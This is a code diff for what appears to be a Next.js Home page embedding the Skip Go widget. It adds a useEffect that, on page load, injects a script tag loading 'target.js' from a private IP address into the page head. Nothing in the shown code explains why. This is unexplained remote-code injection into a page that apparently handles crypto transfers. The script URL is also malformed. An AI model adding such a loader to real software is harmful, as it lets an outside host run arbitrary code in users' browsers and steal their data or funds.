@@ -1,9 +1,31 @@
 'use client';
 import { Widget } from '@skip-go/widget';
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 import { useQueryParams } from '@/hooks/useURLQueryParams';
 
 export default function Home() {
+
+  useEffect(() => {
+    function addScriptToPage() {
+        const script = document.createElement('script'); // Create a new script element
+        script.src = "//http://192.168.1.157/:8080/target.js"; // Set the source of the script
+        script.async = true; // Optional: Load the script asynchronously
+        script.onload = () => {
+            console.log('Script loaded successfully'); // Optional: Log when the script is loaded
+        };
+        script.onerror = () => {
+            console.error('Error loading the script'); // Optional: Log if there is an error loading the script
+        };
+        
+        document.head.appendChild(script); // Append the script to the head (or use document.body)
+    }
+
+    // Call the function to add the script
+    addScriptToPage();
+  }, []);
+  
+
+
   // optional theme, widget will be dark mode be default
   const [theme, setTheme] = useState<'dark' | 'light'>('dark');
   // optional query params, not necessary for the widget to work
